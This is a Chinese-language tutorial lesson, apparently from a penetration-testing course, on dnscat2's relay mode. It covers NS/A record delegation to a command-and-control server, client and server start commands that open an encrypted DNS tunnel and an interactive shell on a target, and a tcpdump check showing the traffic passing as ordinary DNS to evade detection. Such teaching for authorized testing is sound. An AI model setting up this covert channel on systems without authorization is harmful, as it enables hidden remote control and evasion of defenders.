在本节课中，我们将要学习Dnscat2工具的另一种工作模式——中继模式。上一节我们介绍了直连模式，本节中我们来看看如何通过配置DNS域名解析，建立一条隐蔽的命令与控制通道。

![](img/7ee9d83b43ed05e1f64b24dd36931fcd_6.png)

![](img/7ee9d83b43ed05e1f64b24dd36931fcd_7.png)

## 概述
中继模式与直连模式不同，它需要一个公网服务器作为中继点，并通过自定义的DNS域名进行通信。这种模式能更好地绕过一些网络限制，实现更稳定的远程控制。

## 准备工作
要搭建Dnscat2中继模式，需要准备以下三样东西：

以下是所需资源列表：
1.  **一台公网服务器**：这台服务器将作为我们的C&C（命令与控制）服务器。
2.  **一台靶机**：即被控端，可以位于内网或公网。
3.  **一个可配置解析的域名**：这是中继模式的核心，需要一个自己能管理DNS解析记录的域名。

## 域名解析配置
核心步骤是配置DNS解析，将我们的域名指向C&C服务器。以下是配置过程：

![](img/7ee9d83b43ed05e1f64b24dd36931fcd_9.png)

![](img/7ee9d83b43ed05e1f64b24dd36931fcd_10.png)

以下是具体配置步骤：
1.  **创建NS记录**：将域名的DNS解析服务器指向我们C&C服务器的IP地址。例如，将 `ns1.core.cn` 的A记录指向C&C服务器的IP。
2.  **创建子域名的NS记录**：为我们用于通信的特定子域名（例如 `tunnel.core.cn`）指定DNS服务器。将其NS记录设置为上一步的 `ns1.core.cn`。这样，任何对该子域名的DNS查询都会被引导到我们的C&C服务器。

![](img/7ee9d83b43ed05e1f64b24dd36931fcd_12.png)

![](img/7ee9d83b43ed05e1f64b24dd36931fcd_14.png)

![](img/7ee9d83b43ed05e1f64b24dd36931fcd_16.png)

![](img/7ee9d83b43ed05e1f64b24dd36931fcd_18.png)

经过以上配置，一个DNS查询的流向将是：客户端查询 `tunnel.core.cn` -> 根据NS记录找到 `ns1.core.cn` -> 根据A记录找到C&C服务器IP -> 查询请求被发送到C&C服务器的53端口。

![](img/7ee9d83b43ed05e1f64b24dd36931fcd_20.png)

## 服务启动与连接
配置好域名后，即可启动服务。

![](img/7ee9d83b43ed05e1f64b24dd36931fcd_22.png)

![](img/7ee9d83b43ed05e1f64b24dd36931fcd_24.png)

以下是启动命令：
*   **服务端（C&C服务器）启动命令**：
    ```bash
    sudo ./dnscat2-server tunnel.core.cn --secret=your_secret_key
    ```
    此命令指定了通信域名和加密密钥。
*   **客户端（靶机）启动命令**：
    ```bash
    ./dnscat2-client --secret=your_secret_key tunnel.core.cn
    ```
    客户端使用相同的密钥和域名进行连接。

![](img/7ee9d83b43ed05e1f64b24dd36931fcd_26.png)

![](img/7ee9d83b43ed05e1f64b24dd36931fcd_27.png)

服务端启动后监听53端口。客户端启动后，会向 `tunnel.core.cn` 发起DNS查询。由于我们之前的配置，该查询最终会到达我们的C&C服务器，从而建立起一个加密的DNS隧道会话。

![](img/7ee9d83b43ed05e1f64b24dd36931fcd_28.png)

![](img/7ee9d83b43ed05e1f64b24dd36931fcd_30.png)

![](img/7ee9d83b43ed05e1f64b24dd36931fcd_31.png)

![](img/7ee9d83b43ed05e1f64b24dd36931fcd_33.png)

## 效果验证与流量分析
连接建立后，在服务端可以看到新会话建立，并可以通过 `session -i ` 命令进入交互式shell，对靶机进行控制。

![](img/7ee9d83b43ed05e1f64b24dd36931fcd_35.png)

![](img/7ee9d83b43ed05e1f64b24dd36931fcd_37.png)

![](img/7ee9d83b43ed05e1f64b24dd36931fcd_38.png)

为了理解其隐蔽性，我们可以分析网络流量。使用 `tcpdump` 抓取发往C&C服务器53端口的包：

![](img/7ee9d83b43ed05e1f64b24dd36931fcd_40.png)

![](img/7ee9d83b43ed05e1f64b24dd36931fcd_42.png)

```bash
sudo tcpdump -n -i any dst port 53
```

可以看到，所有通信都伪装成了正常的DNS请求（如TXT、A、MX记录类型），数据被编码后附加在子域名前，通过合法的DNS协议进行传输，从而难以被防火墙或入侵检测系统识别。

![](img/7ee9d83b43ed05e1f64b24dd36931fcd_44.png)

![](img/7ee9d83b43ed05e1f64b24dd36931fcd_46.png)

## 总结
本节课中我们一起学习了Dnscat2的中继模式。关键在于**配置DNS解析记录**，将自定义域名的查询指向攻击者控制的服务器，从而建立一条隐蔽的、基于DNS协议的命令控制通道。与直连模式相比，中继模式更具隐蔽性和可靠性，是渗透测试中常用的横向移动与持久化手段。
